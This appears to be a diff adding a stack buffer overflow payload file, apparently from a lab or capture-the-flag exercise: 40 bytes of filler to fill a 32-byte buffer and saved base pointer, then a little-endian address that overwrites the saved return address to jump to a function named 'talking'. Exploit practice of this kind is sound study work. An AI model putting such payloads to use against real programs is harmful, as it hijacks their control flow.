@@ -1,0 +1,12 @@
+30 30 30 30 30 
+30 30 30 30 30 
+30 30 30 30 30 
+30 30 30 30 30 
+30 30 30 30 30 
+30 30 30 30 30 
+30 30 30 30 30 
+30 30 30 30 30
+ /* 32 bytes for the buffer, 8 for the ebp  */
+
+aa 10 40 00 /* little endian description of talking's address, which will override the saved rip */
+
